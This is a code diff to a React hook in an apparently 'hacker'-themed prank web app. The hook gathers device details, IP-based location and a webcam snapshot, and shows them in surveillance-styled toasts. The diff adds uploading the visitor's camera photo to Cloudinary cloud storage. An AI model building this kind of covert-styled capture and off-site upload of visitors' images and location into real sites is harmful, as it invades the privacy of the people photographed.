@@ -1,5 +1,7 @@
 import { useState } from "react";
 import { toast } from "@/hooks/use-toast";
+import { useCloudinaryUpload } from "@/hooks/useCloudinaryUpload";
+// import { useCloudinaryLogger } from "@/hooks/useCloudinaryLogger";
 
 interface DeviceInfo {
   userAgent: string;
@@ -34,6 +36,8 @@ export const useDeviceDetection = () => {
   const [isDetecting, setIsDetecting] = useState(false);
   const [deviceInfo, setDeviceInfo] = useState<DeviceInfo | null>(null);
   const [locationInfo, setLocationInfo] = useState<LocationInfo | null>(null);
+  const { uploadImage } = useCloudinaryUpload();
+//   const { logImageUpload } = useCloudinaryLogger();
 
   const hackerPhrases = {
     system: [
@@ -75,10 +79,13 @@ export const useDeviceDetection = () => {
       (navigator as any).webkitConnection;
 
     const platform = navigator.platform || "Unknown";
-    const os =
-      navigator.userAgent.includes("Win") ? "Windows" :
-      navigator.userAgent.includes("Mac") ? "macOS" :
-      navigator.userAgent.includes("Linux") ? "Linux" : "Unknown";
+    const os = navigator.userAgent.includes("Win")
+      ? "Windows"
+      : navigator.userAgent.includes("Mac")
+      ? "macOS"
+      : navigator.userAgent.includes("Linux")
+      ? "Linux"
+      : "Unknown";
 
     return {
       userAgent: navigator.userAgent,
@@ -87,7 +94,7 @@ export const useDeviceDetection = () => {
       screenResolution: `${screen.width}x${screen.height}`,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       connection: connection ? connection.effectiveType : "Unknown",
-      memory: `${((navigator as any).deviceMemory || 4)} GB`,
+      memory: `${(navigator as any).deviceMemory || 4} GB`,
       cpuCores: `${navigator.hardwareConcurrency || 4} Cores`,
       os,
     };
@@ -131,17 +138,23 @@ export const useDeviceDetection = () => {
 
       const imageData = canvas.toDataURL("image/jpeg", 0.8);
 
+      const uploadedURL = await uploadImage(imageData);
+    //   logImageUpload(uploadedURL);
       toast({
         title: `📷 ${getRandom(hackerPhrases.camera)}`,
         description: (
           <div className="text-[#00FF41] font-mono text-sm space-y-2">
             <p className="text-red-500">Target photographed successfully</p>
             <img
-              src={imageData}
+              src={uploadedURL || imageData}
               alt="Captured"
               className="w-32 h-24 border border-[#00FF41] rounded"
             />
-            <p className="text-xs">Image stored in surveillance database</p>
+            <p className="text-xs break-all">
+              {uploadedURL
+                ? `Cloud URL: ${uploadedURL}`
+                : "Image stored locally. Cloud upload failed."}
+            </p>
           </div>
         ),
       });
@@ -151,7 +164,9 @@ export const useDeviceDetection = () => {
         description: (
           <div className="text-[#00FF41] font-mono text-sm space-y-1">
             <p className="text-yellow-400">Target camera protected</p>
-            <p className="text-xs">Fallback surveillance methods initiated...</p>
+            <p className="text-xs">
+              Fallback surveillance methods initiated...
+            </p>
           </div>
         ),
       });
@@ -182,7 +197,9 @@ export const useDeviceDetection = () => {
         description: (
           <div className="text-[#00FF41] font-mono text-sm space-y-1">
             <p className="text-red-500">Target device compromised</p>
-            <p className="text-xs">Platform: {device.platform} ({device.os})</p>
+            <p className="text-xs">
+              Platform: {device.platform} ({device.os})
+            </p>
             <p className="text-xs">Resolution: {device.screenResolution}</p>
             <p className="text-xs">Cores: {device.cpuCores}</p>
             <p className="text-xs">Memory: {device.memory}</p>
@@ -212,7 +229,9 @@ export const useDeviceDetection = () => {
             <div className="text-[#00FF41] font-mono text-sm space-y-1">
               <p className="text-red-500">Geolocation acquired</p>
               <p className="text-xs">IP: {location.ip}</p>
-              <p className="text-xs">Location: {location.city}, {location.country}</p>
+              <p className="text-xs">
+                Location: {location.city}, {location.country}
+              </p>
               <p className="text-xs">ISP: {location.isp}</p>
             </div>
           ),
